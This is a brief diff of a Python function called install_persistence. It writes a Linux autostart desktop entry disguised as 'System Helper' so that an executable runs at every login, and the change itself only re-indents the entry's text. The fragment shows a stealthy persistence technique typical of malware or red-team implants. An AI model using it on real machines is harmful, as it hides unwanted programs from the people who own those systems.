@@ -179,11 +179,11 @@ def install_persistence():
 
             with open(desktop_path, "w") as f:
                 f.write(f"""[Desktop Entry]
-Type=Application
-Name=System Helper
-Exec={exe_path}
-X-GNOME-Autostart-enabled=true
-""")
+            Type=Application
+            Name=System Helper
+            Exec={exe_path}
+            X-GNOME-Autostart-enabled=true
+            """)
             print(f"[PERSISTENCE] Created autostart entry: {desktop_path}")
 
     except Exception as e:
